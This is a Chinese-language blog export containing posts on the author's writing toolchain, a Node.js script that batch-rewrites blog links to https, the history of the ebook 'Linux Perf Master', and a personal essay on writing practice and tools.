class="built_in">console</span>.log(<span class="string">&#x27;Error during page loading: &#x27;</span>+err);</span><br><span class="line">  process.exit(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate each page from the data provided, using the template.</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;Generating pages...&#x27;</span>);</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">var</span> page <span class="keyword">of</span> <span class="built_in">Object</span>.entries(pages)) &#123;</span><br><span class="line">    <span class="keyword">var</span> pageFullName = page[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">var</span> pageName = page[<span class="number">0</span>].slice(<span class="number">0</span>, page[<span class="number">0</span>].lastIndexOf(<span class="string">&#x27;.&#x27;</span>));</span><br><span class="line">    <span class="keyword">var</span> metaData = pagesMeta.hasOwnProperty(pageName+<span class="string">&#x27;.json&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> source_file = pagesPath +<span class="string">&#x27;/&#x27;</span>+ pageFullName;</span><br><span class="line">    <span class="keyword">var</span> target_file = outputPath +<span class="string">&#x27;/&#x27;</span>+ pageFullName;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//console.log(pageFullName);</span></span><br><span class="line">    <span class="keyword">if</span>(source_file.lastIndexOf(<span class="string">&#x27;.md&#x27;</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> source_str = <span class="string">&#x27;http:\\/\\/riboseyim.github.io&#x27;</span>;</span><br><span class="line">    <span class="keyword">var</span> target_str = <span class="string">&#x27;https:\\/\\/riboseyim.github.io&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> exec = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).exec;</span><br><span class="line">    <span class="keyword">var</span> cmdStr = <span class="string">&#x27;gsed -e &quot;s/&#x27;</span>+source_str+<span class="string">&#x27;/&#x27;</span>+target_str+<span class="string">&#x27;/g&quot; &#x27;</span> + source_file + <span class="string">&#x27; &gt; &#x27;</span> + target_file;</span><br><span class="line">    <span class="built_in">console</span>.log(cmdStr);</span><br><span class="line"></span><br><span class="line">    exec(cmdStr, <span class="function"><span class="keyword">function</span>(<span class="params">err,stdout,stderr</span>)</span>&#123;</span><br><span class="line">      <span class="keyword">if</span>(err) &#123;</span><br><span class="line">         <span class="built_in">console</span>.log(<span class="string">&#x27;exec error:&#x27;</span>+stderr);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         <span class="comment">//console.log(stdout);</span></span><br><span class="line">      &#125;</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;<span class="keyword">catch</span> (err)&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;Error during page generation: &#x27;</span>+err);</span><br><span class="line">  process.exit(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;--------------Done!--------------------&#x27;</span>);</span><br></pre></td></tr></table></figure>
<h3 id="v3-201706"><a href="#v3-201706" class="headerlink" title="v3:201706"></a>v3:201706</h3><p><img src="http://riboseyim-qiniu.riboseyim.com/Writer_Tools_Chain_3.png" alt="v3:201706"></p>
<h4 id="更新内容"><a href="#更新内容" class="headerlink" title="更新内容"></a>更新内容</h4><p><strong>OmniFouse</strong>: 计划管理、进度提醒<br><strong>数据容灾</strong>：统一使用坚果云<br><strong>摄影处理</strong>：图片像素、大小处理<br><strong>OmniGraffle</strong>：存量数据合并整理，空间布局／样式配色技巧升级<br><strong>图床</strong>：云存储分库、图片命名、批处理<br><strong>Evernote、Ulysses</strong>：一般性创意素材从Evernote迁移到Ulysses<br><strong>Atom</strong>: 发布定稿前版本采用Atom作为编辑器<br><strong>GitBook</strong>: 《Linux Perf Master》 反馈极好<br><strong>版权骑士</strong>: 效果不佳，remove</p>
<h3 id="v2-201701"><a href="#v2-201701" class="headerlink" title="v2:201701"></a>v2:201701</h3><p><img src="http://riboseyim-qiniu.riboseyim.com/Writer_Tools_Chain_2.png" alt="v2:201701"></p>
<p><a href="http://www.jianshu.com/p/7c453ce42150">分享：从Evernote到Ulysses</a></p>
<h4 id="更新内容-1"><a href="#更新内容-1" class="headerlink" title="更新内容"></a>更新内容</h4><p><strong>摄影器材</strong>：微单。效果较好的场景：园林、博物馆、航展<br><strong>OmniGraffle</strong>：高级应用技能：图层、统一样式、配色技巧<br><strong>图床</strong>：采用七牛云<br><strong>Evernote</strong>：及时检阅、分类、删除剪辑内容<br><strong>GitBook</strong>: 新手入门<br><strong>Blog generator(hexo)</strong>: 优化Markdown—&gt;Html自动生成、发布流程</p>
<h3 id="v1-201606"><a href="#v1-201606" class="headerlink" title="v1:201606"></a>v1:201606</h3><p><img src="http://riboseyim-qiniu.riboseyim.com/Writer_Tools_Chain_1.png" alt="v1:201606"></p>
<p><a href="http://www.jianshu.com/p/ccc8d64c7202">分享：思维利器OmniGraffle</a></p>
<h4 id="更新内容："><a href="#更新内容：" class="headerlink" title="更新内容："></a>更新内容：</h4><p><strong>Evernote</strong>：素材仓库<br>支持所有手机、平板和电脑。在任意一台设备打开Evernote，随时记录一切、轻松收集资料、一键演示笔记、高效协作共享。</p>
<p><strong>MindManager</strong>：框架梳理<br>一般人的大部分思考过程都是杂乱无序的，没有逻辑的，最后也没法形成有效的沉淀，更无法找到清晰的结论。不是所有的人都是天生就有很好的逻辑的，MindManager可以辅助进行思维整理、分析、可视化的工具。比如写这篇的时候，就是现在MindManager梳理了一个概要，之后导出为文本作为底稿。</p>
<p><strong>OmniGraffle</strong>：思维可视化<br>由The Omni Group制作的一款绘图软件，它曾获得苹果设计奖。可以支持流程图、逻辑图、模型设计等，堪称万能绘图神器。这年头大家都挺忙的，能用一张图表达的意图，就不用写一大堆字啦。</p>
<p><strong>Markdown</strong>：一次编写，到处发表<br>Markdown标记语言，我其实很久以前就掌握了，但是使用频率很低，也谈不上什么美感。真正推动我把Markdown纳入个人工具箱的也是写作，可以说是相辅相成吧。它最大的意义在于通过极简的形式，解决了写作成果的移植通用性的问题。</p>
<p><strong>Ulysses</strong>：样式精美、版本管理、ZoomIn/ZoomOut</p>
<p><strong>版权骑士</strong>：打击盗版，人人有责。</p>
<p>“维权骑士”有一套自己的监测系统。签约作者用发表的文章，都会纳入“维权骑士”的监测系统，并与各公众号、网站发布内容进行“比对”。一旦发现抄袭，将负责代表作者维护版权。</p>
<h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><ul>
<li><a href="https://riboseyim.github.io/2016/06/11/Writing/">最佳写作实践：从Evernote到Ulysses</a></li>
<li><a href="https://riboseyim.com/2018/12/02/Writing-Technical/">技术团队中的作家</a></li>
<li><a href="https://riboseyim.com/2017/06/03/Writing-WriterToolChain/">我的写作工具链</a></li>
<li><a href="https://riboseyim.github.io/2017/08/06/TeamWork-Kanban/">Kanban 看板管理实践精要</a></li>
<li><a href="https://riboseyim.github.io/2017/09/15/Visualization-OmniGraffle/">数据可视化（一）思维利器 OmniGraffle 绘图指南 </a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://zhuanlan.zhihu.com/p/32309940">利用 Atom 为自己打造一个专属 Markdown 编辑器</a></li>
<li><a href="https://www.jianshu.com/p/e8d433a2c5b7">如何在 hexo 中支持 Mathjax？</a></li>
<li><a href="https://www.cnblogs.com/libin-1/p/6638165.html">使用Atom打造无懈可击的Markdown编辑器</a></li>
<li><a href="https://blog.seisman.info/manage-references/">参考文献管理最佳实践</a></li>
</ul>
]]></content>
      <categories>
        <category>出版物</category>
      </categories>
      <tags>
        <tag>eBook</tag>
        <tag>Engineering</tag>
        <tag>Mac</tag>
        <tag>工具癖</tag>
        <tag>Writing</tag>
      </tags>
  </entry>
  <entry>
    <title>电子书：《Linux Perf Master》</title>
    <url>/2017/12/21/eBook-LPM/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p><img src="http://riboseyim-qiniu.riboseyim.com/banner-LPM-201803.png" alt=""></p>
<ul>
<li><a href="https://riboseyim.com/2017/12/21/eBook-LPM/">《The Linux Perf Master》</a></li>
<li><a href="https://www.gitbook.com/book/riboseyim/cyber-security-manual">《The Cyber-Security Master》</a></li>
<li><a href="https://www.gitbook.com/book/riboseyim/machine-learning">《The Machine Learning Master》</a></li>
</ul>
<blockquote>
<p>If you cannot explain something in simple terms, you don’t understand it. The best way to learn is to teach. —— Richard Feynman</p>
</blockquote>
<span id="more"></span>
<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>《The Linux Perf Master》(暂用名) 是一本关于开源软件的电子书。本书与常见的专题类书籍不同，作者以应用性能诊断入手，尝试从多个不同的维度介绍以 Linux 操作系统为核心的开源架构技术体系。全书分为以下几个部分：<br>第一部分：性能诊断入门。介绍 Linux 性能诊断的入门方法，包括资源利用评估、性能监控、性能优化等工作涉及的工具和方法论，以 Stack Overflow 为例介绍一个真实的应用系统架构组成；<br>第二部分：基础设施管理工具。介绍 Ganglia,Ntop,Graphite,Ansible,Puppet,SaltStack 等基础设施管理 &amp; 可视化工具；<br>第三部分：操作系统工作原理。介绍 Linux 操作系统工作原理（Not only Works,But Also How），从动态追踪技术的角度理解应用程序与系统行为；<br>第四部分：通信协议与网络工程。介绍基于 TCP/IP 协议的负载均衡技术，封包过滤技术和态势感知技术；微服务之后的挑战：分布式追踪系统（Planning);<br>第五部分：信息安全篇。介绍木马入侵、黑客攻击、防护与检测，IPv6 、容器等技术发展对安全工作的挑战；介绍信息安全法律；<br>第六部分：工程管理篇。尝试跳出 IT 视野讨论人才培养，DevOps 组织、效率和工程管理方法；<br>第七部分：社区文化篇。介绍黑客文化、开源作者、开发者社区和知识产权法，“技术首先是关于人的”（Technology is first about human beings）。</p>
<h2 id="背景：我的第一本电子书"><a href="#背景：我的第一本电子书" class="headerlink" title="背景：我的第一本电子书"></a>背景：我的第一本电子书</h2><p>2016年7月份我已经提到，希望能实现一个小目标：出版一本专业书籍。目标虽小，实现不易。参阅了众多老司机的成功经验，我决定还是先整理一本电子书出来。《Linux Perf Master》Edition 0.1 在 <strong>2017-02-10</strong> 首次发布于 GitBook 平台，主题以 Linux 性能为核心，覆盖评估诊断、监控、优化的工具和方法论，还补充了几个参考案例。该书编辑过程中，早期没有使用 Markdown 发表的文章，没办法做到一键复用，必须再次进行繁琐的排版。另外，个人也不推荐使用编辑器：GitBook Editor for Mac ，它使用起来不太友好，也很容易崩溃。也不推荐在本地搭建一套自己的GitBook服务端，对个人用户来说过于繁琐。我的方式是“本地编写+自动同步”的方式：Git + Markdown真是珠联璧合、威力无穷。更多细节请查看：<a href="https://riboseyim.github.io/2017/06/03/Writing-WriterToolChain/">我的写作工具链（持续更新）</a>。</p>
<h4 id="GitBook-地址"><a href="#GitBook-地址" class="headerlink" title="GitBook 地址"></a>GitBook 地址</h4><ul>
<li><a href="https://riboseyim.gitbook.io/perf">https://riboseyim.gitbook.io/perf</a></li>
<li><a href="https://www.gitbook.com/book/riboseyim/linux-perf-master/details">https://www.gitbook.com/book/riboseyim/linux-perf-master/details</a></li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/ebook-linuxperfmaster-1.png" alt=""></p>
<h2 id="Amazon-上架"><a href="#Amazon-上架" class="headerlink" title="Amazon 上架"></a>Amazon 上架</h2><ul>
<li>缺少资源：代理人</li>
</ul>
<h2 id="国内出版"><a href="#国内出版" class="headerlink" title="国内出版"></a>国内出版</h2><ul>
<li><p>缺少资源：出版社</p>
</li>
<li><p><a href="https://www.gitbook.com/book/riboseyim/linux-perf-master/details">《Linux Perf Master》</a>：Edition 1.0 | 2016 | 电子工业出版社 | 选题阶段枪毙</p>
</li>
</ul>
<h2 id="GitBook-访问数据"><a href="#GitBook-访问数据" class="headerlink" title="GitBook 访问数据"></a>GitBook 访问数据</h2><div class="table-container">
<table>
<thead>
<tr>
<th>时间点</th>
<th>订阅用户数</th>
<th>Downloads</th>
<th>Unique visitors</th>
<th>Page Views</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>201701</td>
<td>——-</td>
<td>——-</td>
<td>——-</td>
<td>——-</td>
<td>GitBook Edition 0.1</td>
</tr>
<tr>
<td>20170630</td>
<td>135</td>
<td>4,206</td>
<td>4,936</td>
<td>——-</td>
<td>GitBook Edition 0.2</td>
</tr>
<tr>
<td>20170830</td>
<td>154</td>
<td>4,503</td>
<td>5,989</td>
<td>23,505</td>
<td>——-</td>
</tr>
<tr>
<td>20170930</td>
<td>157</td>
<td>4,553</td>
<td>6,471</td>
<td>24,944</td>
<td>——-</td>
</tr>
<tr>
<td>20171230</td>
<td>187</td>
<td>4,821</td>
<td>7,708</td>
<td>29,052</td>
<td>GitBook Edition 0.3</td>
</tr>
</tbody>
</table>
</div>
<h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><p>国内用户访问GitBook不太稳定，提供百度云快捷下载，同时提供了pdf、mobi、ePub三种格式。</p>
<ul>
<li><a href="https://pan.baidu.com/s/1C20TAKtYxXeRkTjNy43WOQ">Edition 0.4 20180714</a></li>
<li><a href="https://pan.baidu.com/s/1bppqKdL">Edition 0.3 20171225</a></li>
<li><a href="https://pan.baidu.com/s/1i4VsrbR">Edition 0.2 20170701</a></li>
<li><a href="https://pan.baidu.com/s/1bpGdzFT">Edition 0.1 20170210</a></li>
</ul>
<h2 id="历史版本"><a href="#历史版本" class="headerlink" title="历史版本"></a>历史版本</h2><p><strong>基本原则：持续发布，争取做到每四个月发布一个新版本</strong></p>
<h4 id="Edition-0-4-20180714"><a href="#Edition-0-4-20180714" class="headerlink" title="Edition 0.4 20180714"></a>Edition 0.4 20180714</h4><ul>
<li>mod “网络工程篇”调整为分布式系统专题</li>
<li>mod Pcap、sFlow 调整到Cyber-Security专题</li>
<li>add 应用监控与可视化;LinkedIn Kafka Monitor</li>
<li>add 应用监控与可视化;2018 Docker 用户报告</li>
<li>add PostgreSQL 数据库</li>
<li>add 案例：基于 Kafka 的事件溯源型微服务</li>
<li>add 分布式追踪系统体系概要</li>
<li>add 开源分布式跟踪系统 OpenCensus</li>
<li>add 从作坊到工厂的寓言故事</li>
<li>add 基础设施标准化：部署和配置管理</li>
<li>add macOS vs Linux Kernels ？</li>
<li>add IT 工程师养生指南</li>
</ul>
<h4 id="Edition-0-3-20171225"><a href="#Edition-0-3-20171225" class="headerlink" title="Edition 0.3  20171225"></a>Edition 0.3  20171225</h4><ul>
<li>修订 Linux 快速性能诊断三篇、gRPC</li>
<li>监控数据可视化：Graphite、GIS</li>
<li>How Linux Works:内存管理</li>
<li>调整部分章节顺序</li>
</ul>
<h4 id="Edition-0-2-20170701"><a href="#Edition-0-2-20170701" class="headerlink" title="Edition 0.2  20170701"></a>Edition 0.2  20170701</h4><ul>
<li>Linux 入门命令100条</li>
<li>How Linux Works: Kernel Space &amp; User Space Init</li>
<li>动态追踪技术：strace,gdb,ftrace,bcc,BPF</li>
<li>基于数据分析的网络态势感知</li>
<li>Cyber-Security:IPv6,Web Headers,香港CSTCB</li>
</ul>
<h4 id="Edition-0-1-20170210"><a href="#Edition-0-1-20170210" class="headerlink" title="Edition 0.1  20170210"></a>Edition 0.1  20170210</h4><ul>
<li>第一个 GitBook 版本，主要为 2016 年内容合辑</li>
<li>基于Linux单机负载评估</li>
<li>新一代Ntopng网络流量监控—可视化和架构分析</li>
<li>基于LVS的AAA负载均衡架构实践</li>
<li>Linus Torvalds: The mind behind Linux</li>
</ul>
<h2 id="读者反馈信息"><a href="#读者反馈信息" class="headerlink" title="读者反馈信息"></a><a href="https://riboseyim.github.io/2017/07/05/Writing-Reader-Question/">读者反馈信息</a></h2>]]></content>
      <categories>
        <category>出版物</category>
      </categories>
      <tags>
        <tag>SRE</tag>
        <tag>DevOps</tag>
        <tag>Linux</tag>
        <tag>eBook</tag>
        <tag>Engineering</tag>
        <tag>Developer</tag>
        <tag>Writing</tag>
      </tags>
  </entry>
  <entry>
    <title>最佳写作实践：从Evernote到Ulysses</title>
    <url>/2016/06/11/Writing/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>一、写作的定义</li>
<li>二、我的困惑</li>
<li>三、缘起：《顾准日记》</li>
<li>四、写作素材</li>
<li>写作工具箱</li>
</ul>
<p>180天个人业余写作总结：从缘起、驱动力、工具链、成果影响等角度展开，全方位实录这段过程实践，发表出来对自己是一种鞭策，也希望能够为需要的朋友提供一些思考和帮助。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Ulysses-版本管理.png" alt="Ulysses"></p>
<span id="more"></span>
<blockquote>
<p>写作可以成为你的一个伴侣，能在你的周围筑起一个看不见摸不着的水晶空间，你就像鱼缸里的一条金鱼，不过这个鱼缸是金鱼自己造出来的。写作一直陪伴着我，旅途中也没有片刻停下来，所以我从未感到无所事事。不是玻璃需要磨光，就是结构需要调整，要不就是缸体需要加固。（温斯顿·S·丘吉尔《丘吉尔传·我的青春》p227）</p>
</blockquote>
<h2 id="一、写作的定义"><a href="#一、写作的定义" class="headerlink" title="一、写作的定义"></a>一、写作的定义</h2><p>笔者是一个普通人，跑来谈写作，还是最佳实践，似乎有点标题党的嫌疑，毕竟我既没有专业作家的身份，也不够网红的最低门槛。首先，让我们来看看写作（Writing）的一般定义：</p>
<blockquote>
<p>Writing is a medium of human communication that represents language and emotion through the inscription or recording of signs and symbols. (From Wikipedia)</p>
</blockquote>
<p>因此，写作本质上并不是某些职业的专属技能，而是人类出于交流目的的普遍需求。理解这几个概念之后，后面的话题就好展开了。</p>
<h2 id="二、我的困惑"><a href="#二、我的困惑" class="headerlink" title="二、我的困惑"></a>二、我的困惑</h2><p>对于很多朋友、特别是已经有过一定实际工作经验的人来说，或许很多都有下面类似的问题，我总结为三大症状：</p>
<ol>
<li>“专业”有余，能力弱化，视野日小</li>
<li>计划愈多，碎片愈多，效率愈低</li>
<li>地狱修行，独行无友，沉于安逸</li>
</ol>
<p>一般而言，离开学校之后，人群个体开始接受社会化的训练引导，经年之后，大多数人会完成塑造定型，成为分工体系里新的螺丝钉或者齿轮。日子叠着日子，工作夹杂着琐碎，也许积累了不少“专业”知识，但是不知不觉中，有一项最重要的技能却逐渐弱化了——接受新事物的心态、系统掌握新知识、新技能的学习能力。</p>
<p>在多如牛毛的抗战片里面，我认为唯一可看、且达到思想高度的是《我的团长我的团》，剧中死啦死啦的《论安逸》堪称经典：“死都不怕，就怕不安逸，命都不要，就要安逸，就这毛病。多少年来这是个被人钉死了的死穴，一打一个准儿……”。</p>
<p>打个不恰当的比方吧，在学校里读书就像待在正面战场，颇有金戈铁马、喊声震天的味道，或者人人都还在假装有那个味道；在工作以后读书、在过日子中读书，那就不一样了，人民群众喜闻乐见的还得是安逸。升官发财、结婚生子方是热点，读书求道、探索未知却很难找到位置——我们民族的内心深处，和福禄寿走得比较近，距受难先知比较远。</p>
<h2 id="三、缘起：《顾准日记》"><a href="#三、缘起：《顾准日记》" class="headerlink" title="三、缘起：《顾准日记》"></a>三、缘起：《顾准日记》</h2><p>由于工作的关系，过去一整年的时间里发生了一些变化，对于过去的经历、思想和行为做了比较深入的梳理和反思。基于某些因缘——我很喜欢这个词，“前缘相生，因也；现相助成，缘也”，一切有所得，皆是时机成熟而已。</p>
<p>首要因缘就是是读了《顾准历史文集》和《顾准日记》。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/顾准日记.png" alt="顾准日记"></p>
<p>我们想象一下：退回到现代迷信充斥在上世纪70年代的中国，有这样一个“形单影只、独处斗室，以啃冷馒头、钻图书馆度日以至于死”（李慎之语）的知识分子，顶住了政治的、思想的、生存的、体质的重压，不时发出了独立而超前之想。</p>
<blockquote>
<p>那是一个会把人席卷而去的时代，他怎么能在风暴中趴在地上紧紧扣住这两颗石子，而不被吹走，甚至连气息都不沾染?顾准后来说过，这一年的生活让他养成‘读史’的习惯。这种习惯的好处就是“样样东西都要自己学着去判断”。(柴静)</p>
</blockquote>
<p>关于顾准其人、其事和评价争议，我不想在这里过多展开，唯一需要说明的是：相较于强制劳动和物质匮乏，灌输型的思想管制，才是劳改营的精髓所在。能在长久的牢狱中活下来、不丢失自由本性、甚至能有所成就，学习、思考是唯一的救赎之路，也是最难坚守的“反动”品质。</p>
<blockquote>
<p>习惯一旦生成，就会自动带着人去往未知之地。</p>
</blockquote>
<p>情怀就是这些，下面介绍一些写作实践过程中的技术细节：</p>
<h2 id="四、写作素材"><a href="#四、写作素材" class="headerlink" title="四、写作素材"></a>四、写作素材</h2><h4 id="Known-Knowns：知识体系重构"><a href="#Known-Knowns：知识体系重构" class="headerlink" title="Known Knowns：知识体系重构"></a>Known Knowns：知识体系重构</h4><p>在开始写东西之前，第一件事情应该是深度梳理自己的知识结构，大而言之，无非是以下三类：</p>
<ol>
<li>Known Knowns:已知的已知</li>
<li>Known UnKnowns:已知的未知</li>
<li>Unknown Unknowns:未知的未知</li>
</ol>
<p>第一类：通常是就读的专业、长期从事的工作。我们在这些领域往往已经有了较长时间的投入、系统的知识框架和一定的实务经验，是最有可能提供优质输出内容的方向。<br>第二类：主要体现在广度和深度。这部分内容通常是专业内需要涉猎、深入学习的东西，个人能力可以判断自己是否掌握，只要加以努力，都可以有所收获的领域。<br>第三类：更高的境界、超出现有知识体系范围，如果要获得这类知识，一般需要非线性、跨越式的学习经历。<br>示例：</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/知识体系梳理.png" alt="知识体系梳理"></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Evernote笔记本.png" alt="Evernote笔记本"></p>
<h4 id="素材一：无笔记不读书"><a href="#素材一：无笔记不读书" class="headerlink" title="素材一：无笔记不读书"></a>素材一：无笔记不读书</h4><p>在这个《21天精通XX编程》、《图解资治通鉴》、《一本书看透金融》充斥眼帘的时代，还有人深度阅读吗？在这个大师遍地、专家变砖、天天都在喊颠覆的时代，又该把有限的学习精力投资在哪里呢？</p>
<p>微博上一位牛人曾有高论：“成千上万种媒体与论坛，同质化的,重复的,口号式的,改头換面的,无病呻吟的內容和语言太多太多了，充其量有與论意义而无学术意义”。<br>“如果能选一二本读透读通，读到能基本复述，远比读十本甚至几十本”快餐书”有用、省时间，有一揽众山小之感。”</p>
<p>诚如斯言。少林武功七十二绝技，天下各派兵器、套路更是成千上万，就算是天才，终其一生练其十分之一都不可能。这“一二本”需要读透读通的书，应该就是基本功之外，入门弟子都渴望掌握的上乘功夫、心法口诀，登堂入室之不二法门。</p>
<p>从这个角度出发，我最先尝试的是写读书笔记。</p>
<p>例如最近一年看的《万历十五年》、《伍连德》、《李自成》和《尘埃落定》等传记、小说，如果按照以前的习惯，可能也就是随便翻一翻，但是基于读书笔记的任务导向，主要还是公开发表的鞭策——就不得不反复阅读几遍，以期准确把握作者的意图。</p>
<p>针对另一些大部头的专著，一般会略超出接受能力。我尝试过在线公布进度的方法。也是一个好办法。例如，《性能之颠》：</p>
<blockquote>
<p>第一阶段：201601。<br>               分享：《系统专家系列：性能之巅1》 框架结构、未深入<br>第二阶段：201603。关联阅读《24小时365天不间断服务》。<br>              分享《系统专家之路－推荐书单》<br>            分享《基于Linux单机的负载评估》<br>第三阶段：201604-05。<br>               完成第一次通读。掌握体系结构、主要概念。<br>               关联阅读Brendan Gregg’s Blog &amp; Github 。（深度精品）<br>              分享：《Netflix性能分析模型：In 60 Seconds》<br>第四阶段：20160512～<br>计划：深入掌握DTrace、火焰图</p>
</blockquote>
<p>在初始的1-2个月时间内，由于先前知识储备的不足，一度出现停滞。后面通过持续的扩展阅读和交流，一扫前期的混沌矇昧状态，宛如打开了一扇通往新世界的窗户。</p>
<h4 id="素材二：让翻译成为一种习惯"><a href="#素材二：让翻译成为一种习惯" class="headerlink" title="素材二：让翻译成为一种习惯"></a>素材二：让翻译成为一种习惯</h4><p>坦白说，我的英文水平以前并不好，现在也好不到哪里去。<br>今年我养成了业余翻译的习惯，这首先要感谢《Economist》。</p>
<p>在全球报业大萧条的背景下，《Economist》依然能够逆势增长，得益于其独特风格：简约不失观点、视野宽广不失深度、幽默而发人思考、丰富的数据表现力等等。特别是在信息爆炸，甚至信息过载的时代，注意力是最宝贵的资源 , 谁能提供最优质的有效信息，谁就是最有价值的人。经济学人显然做到了。</p>
<p>我还是阅读并翻译一段时间的《Economist》之后才知道，本国相当数量的本科生也在翻译它——他们只是当考研练习题做，真是可惜。回想过去，应该会有不少人和我一样的体会，本朝的英语考试真的非常恶心：卷面上蚂蚁一样小的字、机械的排版、多如牛毛永远也做不完的阅读理解习题、变态的选项设置……几乎要把人的兴趣消磨殆尽，更谈不上什么阅读乐趣。</p>
<p>《Economist》优质的文章，吸引我持续阅读，碰到精妙之处更不禁击节赞叹，甚于把好文章翻译出来和更多人分享，也就成了水到渠成的事。从我熟悉的中国版开始，再到国际关系版块，再到其它感兴趣的文章，甚至于进一步扩展到职业相关领域的内容。通过阅读而翻译，为了更好的翻译就得阅读更多内容，一个良性的反馈环路就此形成。</p>
<h2 id="五、写作工具箱"><a href="#五、写作工具箱" class="headerlink" title="五、写作工具箱"></a>五、写作工具箱</h2><p>不能否认，总是有很多不世出的神人，完全可以用纯文本写出煌煌巨著、打磨出神兵利器。但是我等凡人，还是需要一些工具的辅助。我的工具箱不是在一开始就形成的——现在也还处于演化过程中，工具链的选择过程，尝试－比较－抛弃的选择过程，本身就是一个不断迭代重构的过程。</p>
<p><strong>工欲善其事，必先利其器</strong></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/写作工具链.png" alt="我的写作工具链"></p>
<p><strong>Evernote</strong>：素材仓库<br>支持所有手机、平板和电脑。在任意一台设备打开Evernote，随时记录一切、轻松收集资料、一键演示笔记、高效协作共享。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Evernote截取.png" alt="Evernote一键剪藏"></p>
<p><strong>MindManager</strong>：框架梳理<br>一般人的大部分思考过程都是杂乱无序的，没有逻辑的，最后也没法形成有效的沉淀，更无法找到清晰的结论。不是所有的人都是天生就有很好的逻辑的，MindManager可以辅助进行思维整理、分析、可视化的工具。比如写这篇的时候，就是现在MindManager梳理了一个概要，之后导出为文本作为底稿：</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Mind构思草稿.png" alt="Mind构思草稿"></p>
<p><strong>OmniGraffle</strong>：思维可视化<br>由The Omni Group制作的一款绘图软件，它曾获得苹果设计奖。可以支持流程图、逻辑图、模型设计等，堪称万能绘图神器。这年头大家都挺忙的，能用一张图表达的意图，就不用写一大堆字啦。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/perf-path.png" alt=""></p>
<p><strong>Markdown</strong>：一次编写，到处发表<br>Markdown标记语言，我其实很久以前就掌握了，但是使用频率很低，也谈不上什么美感。真正推动我把Markdown纳入个人工具箱的也是写作，可以说是相辅相成吧。它最大的意义在于通过极简的形式，解决了写作成果的移植通用性的问题。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Markdown发布链条.png" alt="发布链条"></p>
<p><strong>Ulysses</strong>：美轮美奂</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Ulysses-版本管理.png" alt="Ulysses-版本库"></p>
<p><strong>版权骑士</strong>：打击盗版，人人有责。</p>
<p>“维权骑士”有一套自己的监测系统。签约作者用发表的文章，都会纳入“维权骑士”的监测系统，并与各公众号、网站发布内容进行“比对”。一旦发现抄袭，将负责代表作者维护版权。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/维权服务.png" alt="第三方维权服务"></p>
<p><strong>阅读用户分析</strong></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/反馈分析.png" alt="用户分析－终端类型"></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/反馈分析－地区分布.png" alt="用户分析－地区分布"></p>
<h2 id="六、经验谈"><a href="#六、经验谈" class="headerlink" title="六、经验谈"></a>六、经验谈</h2><p>为了保证持续输出，就需要进行大量扩展活动，甚至通过大量绘图的方式整理思路。例如读完黄仁宇的明史系列文集之后，还专门留意了明朝摩崖石刻遗址、戚继光纪念祠故地，进行现场观察、拍照。</p>
<p>搭建个人网站，将已知、未知、感兴趣的领域划分出来，再把思维碎片、已经发布的作品填充进去，再编辑再梳理，就可以强有力地推动个人<strong>知识体系的结构性重构</strong>。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/个人站点.png" alt="个人站点"></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/个人网站－索引树.png" alt="个人网站－索引树"></p>
<h4 id="内容为王"><a href="#内容为王" class="headerlink" title="内容为王"></a>内容为王</h4><p>作品发布之后，可以借助分析工具查看阅读量、用户分布等信息。先来看一组数字：180天，累计超10万字，订阅用户数200＋，初步形成微生态圈。</p>
<p>分析这些数字背后的来源，实际上又最集中在以下三篇：</p>
<ol>
<li><p>《最佳工程实践－思维利器OmniGraffle》<br>分析：工具指南类型，但是我没有局限于功能性－因为这类一般已经比较多了，不大可能比别人写得更详细、更好，而是从方法论的角度提供建议，获得不少产品经理的青睐。</p>
</li>
<li><p>《新一代Ntopng网络流量监控—可视化和架构分析》<br>分析：相对前沿、内容新，标题党，持续获得专业用户关注。</p>
</li>
<li><p>《Stack Overflow 架构分析》（译）<br>分析：行业大号推荐：单日阅读5000+，对于行业细分领域来说还算不错。甚至在外界传播之后，反向影响到公司内部。</p>
</li>
</ol>
